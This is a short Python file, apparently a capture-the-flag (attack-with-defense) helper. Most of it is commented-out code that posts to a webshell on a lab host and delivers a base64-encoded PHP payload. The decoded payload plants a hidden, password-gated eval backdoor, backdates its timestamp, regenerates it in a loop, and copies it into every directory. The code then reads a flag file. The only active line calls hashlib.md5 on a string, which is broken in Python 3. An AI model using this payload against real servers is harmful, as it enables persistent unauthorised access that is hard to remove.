# -*- coding: utf-8 -*-
# # 作者    : 轩昂妄想
# # 文件    : test.py
# # 时间    : 2022/10/13 15:11
# # -----------------------------------------------------------------------------------
# import requests
# url="http://192.168.56.135/awd"
# shell='/index.php'
# passwd="a"
# port='80'
# busi = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iY2YzNmE4M2JlN2M0MDM3NmFkYWQ5ZDBhYmIzNmFjYzAiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAuY29uZjFnLnBocCcpOwogICAgc3lzdGVtKCJlY2hvICdkSEpoZG1WeVpHbHlLQ2tvY0hWemFHUWdJaVF4SWlBK0lDOWtaWFl2Ym5Wc2JDQXlQaVl4TzJadmNpQm1hV3hsSUdsdUlHQnNjeUF0TVdBN1pHOGdhV1lnZEdWemRDQXRaQ0FpSkdacGJHVWlPM1JvWlc0Z1kzQWdKRkJYUkM4dVkyOXVaakZuTG5Cb2NDQWtVRmRFTHlSbWFXeGxPMlZqYUc4Z0lpUlFWMFF2SkdacGJHVWlPM1J5WVhabGNtUnBjaUFpSkdacGJHVWlJQ0lrS0NoMFlXSWdLeUF4SUNBcEtTSTdabWs3Wkc5dVpTazdkSEpoZG1WeVpHbHknIHwgYmFzZTY0IC1kID4gMS5zaCIpOwogICAgJGFzZCA9IHN5c3RlbSgiYmFzaCAxLnNoIik7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > /www/wwwroot/192.168.56.135/conf1g.php");'''
# payload={
#     passwd:'print_r(readfile(\'flag\'));'
# }
# url1=url+shell
# print(url1)
# response=requests.post(url1,payload,timeout=1)
# print(response.text)
import hashlib

a = hashlib.md5("123")
print(a)